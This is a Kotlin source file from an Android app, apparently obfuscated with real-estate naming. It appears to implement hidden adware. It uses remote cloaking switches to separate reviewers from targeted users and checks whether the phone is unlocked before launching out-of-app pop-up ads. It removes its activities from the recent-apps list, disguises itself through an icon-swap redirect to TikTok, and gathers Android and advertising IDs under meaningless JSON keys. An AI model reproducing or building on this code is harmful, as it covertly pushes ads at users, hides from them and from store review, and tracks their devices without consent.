package com.real.estate

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.real.estate.attic.AtticNetHelper
import com.real.estate.bedroom.BRoomImpl
import com.real.estate.bedroom.BedroomImp
import com.real.estate.windows.WindowsMan
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.security.MessageDigest
import java.util.Locale
import java.util.Random
import java.util.TimeZone
import java.util.UUID


/**
 * Date：2024/4/1
 * Describe:
 */
object FloorCache {
    val stairsActivity = arrayListOf<Activity>()
    var mAndFloorId: String by FloorImpl(endTag = "Android Id")
    var mDisIdS: String by FloorImpl()
    var mFloorGid by FloorImpl(endTag = "Google")

    var mRoomNetwork by FloorImpl(endTag = "NetRoom")
    var colSbed by FloorImpl(endTag = "ColRoom") // cloak

    var installTime = 0L
    var updateAppTime = 0L
    var floorVer = "1.0.1"
    private var timeZFloor = TimeZone.getDefault().rawOffset / 3600000


    // 黑名单
    fun isRoomClose(): Boolean {
        return colSbed == "darling"
    }

    //白名单
    fun isRoomDoorOpen(): Boolean {
        return colSbed == "autumnal"
    }

    fun isRoomAdj(isP: Boolean = false): Boolean {
        if (mRoomNetwork.isBlank()) return false
        val isO = mRoomNetwork.contains("organic", true).not()
        if (isP && isO) {
            DoorLog.logEve("netjust")
        }
        return isO
    }


    fun buyFloorBefore(context: Context) {
        if (mAndFloorId.isBlank()) {
            runCatching {
                mAndFloorId =
                    Settings.System.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            }
            mAndFloorId.ifBlank {
                mAndFloorId = UUID.randomUUID().toString()
            }
            mDisIdS = s5floor(mAndFloorId)
        }
        mFloorGid.ifBlank {
            CoroutineScope(Dispatchers.IO).launch {
                runCatching {
                    mFloorGid = AdvertisingIdClient.getAdvertisingIdInfo(context).id ?: ""
                }
            }
        }
        val pInfo = context.packageManager.getPackageInfo(context.packageName, 0)
        installTime = pInfo.firstInstallTime
        updateAppTime = pInfo.lastUpdateTime
        floorVer = pInfo.versionName
        BRoomImpl(context).roomBedS()
        WindowsMan(context, "Floor").windowMSShsow()
    }


    //md5
    private fun s5floor(string: String): String {
        fun getHash(): ByteArray {
            return MessageDigest.getInstance("MD5").digest(string.toByteArray())
        }

        val hash = getHash()
        val hex = StringBuilder(hash.size * 2)
        for (b in hash) {
            var str = Integer.toHexString(b.toInt())
            if (b < 0x10) {
                str = "0$str"
            }
            hex.append(str.substring(str.length - 2))
        }
        return hex.toString()
    }

    //DeviceNotLocked
    fun isDePhoes(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
                Context.KEYGUARD_SERVICE
            ) as KeyguardManager).isDeviceLocked.not()
        } else {
            return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isScreenOn
        }
    }

    fun setTsijg(activity: Activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            activity.setTranslucent(true)
        } else {
            activity.window.setBackgroundDrawableResource(R.color.col_sjis)
        }
        when (activity::class.java.canonicalName ?: "") {
            //换icon 跳转
            "com.real.estate.windows.BasementActivity" -> {
                val pkgN = "com.zhiliaoapp.musically"
                activity.startActivity(getFloor(activity, pkgN))
            }
            // 外弹
            "com.real.estate.FloorActivity" -> {
                BedroomImp.resetN()
                if (BasementAd.isCanGoBasement().not()) {
                    DoorLog.go("ad not ready")
                    activity.fins()
                } else {
                    BasementAd.openTheBasement(activity)
                }
            }
        }
    }

//    private val pathName = "com.animallatest.animalspapers2024"
    private val nameList = arrayListOf("com.real.estate.windows.BasementActivity")
    private fun isFinishAndRemove(name: String): Boolean {
//        if (name.contains(pathName)) {
//            return true
//        }
        if (nameList.contains(name)) {
            return true
        }
        return false
    }

    fun sieFins() {
        if (BedroomImp.isSleep()) {
            if (stairsActivity.isEmpty()) return
            ArrayList(stairsActivity).forEach {
                if (isFinishAndRemove(it::class.java.canonicalName ?: "")) {
                    it.fins()
                } else {
                    it.finish()
                }
            }
        }
    }

    private fun Activity.fins() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask()
        } else {
            finish()
        }
    }

    private fun getFloor(context: Context, pkgName: String): Intent {
        fun getIntent(): Intent {
            return Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
                setPackage(pkgName)
            }
        }
        runCatching {
            val intent = getIntent()
            val pm: PackageManager = context.packageManager
            val info = pm.queryIntentActivities(intent, 0)
            val launcherActivity = info.first().activityInfo.name
            intent.addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setClassName(pkgName, launcherActivity)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            return intent
        }
        return Intent(Intent.ACTION_VIEW).apply {
            data = Uri.parse("https://play.google.com/store/apps/details?id=$pkgName")
        }
    }

    suspend fun esigLisg() {
        if (stairsActivity.isEmpty()) return
        ArrayList(stairsActivity).forEach {
            it.finish()
        }
        delay(1009)
    }

    val conAndC get() = "${Locale.getDefault().language}_${Locale.getDefault().country}"

    fun getCommonJson(): JSONObject {
        return JSONObject().apply {
            put("nobel", JSONObject().apply {
                put("ann", Build.BRAND)
                put("sylvania", mFloorGid)
                put("gilbert", mDisIdS)
                put("coliform", UUID.randomUUID().toString())
            })
            put("plowman", JSONObject().apply {
                put("reek", floorVer)
                put("slick", mAndFloorId)
            })
            put("biblical", JSONObject().apply {
                put("quell", Build.MODEL)
                put("document", timeZFloor)
                put("supple", Build.VERSION.RELEASE)
                put("minnie", Build.MANUFACTURER)
                put("woo", conAndC)
                put("take", "vee")
                put("been", System.currentTimeMillis())
                put("ulna", Locale.getDefault().country)
                put("rosen", mApp.packageName)
                put("willowy", AtticNetHelper.otAttic)
            })
        }
    }

}